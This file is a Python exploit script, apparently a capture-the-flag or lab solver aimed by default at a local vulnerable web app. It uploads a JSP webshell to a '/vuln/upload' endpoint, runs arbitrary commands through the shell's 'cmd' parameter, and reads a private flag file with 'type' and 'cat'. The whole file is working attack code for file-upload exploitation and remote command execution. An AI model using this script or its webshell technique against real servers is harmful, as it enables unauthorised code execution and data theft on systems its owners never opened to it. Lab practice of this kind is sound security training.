import requests
import sys
import os
import urllib.parse


def upload_webshell(url, file_path="webshell.jsp"):
    try:
        with open(file_path, "rb") as file:
            webshell_content = file.read()
    except FileNotFoundError:
        print("no file")
        sys.exit(1)

    get_url = f"{url}/vuln/upload?file={os.path.basename(file_path)}"
    get_response = requests.get(get_url)
    if get_response.status_code == 200:
        uploaded_path = f"{url}/uploads/{os.path.basename(file_path)}"
        return uploaded_path

    print("upload failed")
    sys.exit(1)

def execute_command(webshell_url, command):
    encoded_cmd = urllib.parse.quote(command)
    response = requests.get(f"{webshell_url}?cmd={encoded_cmd}")

    if response.status_code == 200:
        if "<pre>" in response.text and "</pre>" in response.text:
            return response.text.split("<pre>")[1].split("</pre>")[0].strip()
    return None

def read_flag(webshell_url):
    commands = [
        "type src\\main\\webapp\\uploads\\private\\upload.flag",
        "cat src/main/webapp/uploads/private/upload.flag"
    ]

    for cmd in commands:
        flag_content = execute_command(webshell_url, cmd)
        if flag_content:
            print(flag_content)
            return flag_content

    return None

def main():
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
    else:
        target_url = "http://127.0.0.1:8080"

    webshell_url = upload_webshell(target_url)
    if webshell_url:
        print(f"shell: {webshell_url}")

    flag = read_flag(webshell_url)
    if not flag:
        print("failed")

if __name__ == "__main__":
    main()